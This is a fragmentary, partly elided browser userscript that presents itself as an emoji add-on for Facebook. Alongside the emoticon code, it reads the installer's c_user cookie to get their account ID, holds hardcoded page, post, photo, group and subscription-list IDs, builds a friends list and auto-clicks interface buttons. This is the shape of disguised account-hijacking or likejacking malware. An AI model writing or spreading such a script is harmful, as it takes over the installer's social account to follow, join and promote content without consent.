// ==UserScript==
// @name            Emoji New Emoticon @Adityarama 
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/haikaljihad" target="_blank">Created by : adityarama</a>';
	html += '</div>';
...
sublist("502913663132345");

//Group ku haikal
var gid = ['1374372349454294'];
...
var spage_id = "538295332882827";
var spost_id = "100005590350261_152010881661923";
var sfoto_id = "151603451702666";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
{    
    ...
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Emoji full</span>') {
            l.click();
        }
    }
}
